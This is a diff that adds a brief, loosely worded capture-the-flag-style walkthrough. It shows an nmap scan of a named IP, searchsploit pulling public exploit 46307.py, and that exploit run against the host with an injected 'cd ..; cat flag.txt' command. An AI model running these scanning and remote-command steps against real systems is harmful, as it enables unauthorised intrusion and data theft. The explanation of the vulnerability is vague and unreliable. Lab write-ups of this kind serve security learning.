@@ -1,0 +1,11 @@
+I checked it on nmap and found that this site run ssh service on a OpenSSh version. So searchsploit
+might be a good choise.
+
+It type is remote so I can run commands remotely and it does not have a security and runs all commands
+this is its vulnerability and by this we can get information.
+
+sudo nmap -sV -A -T4 -sC -sS 35.198.135.192
+
+searchsploit lib
+searchsploit -m linux/remote/46307.py 
+python3 46307.py 35.198.135.192 30485  "cd ..; cat flag.txt"
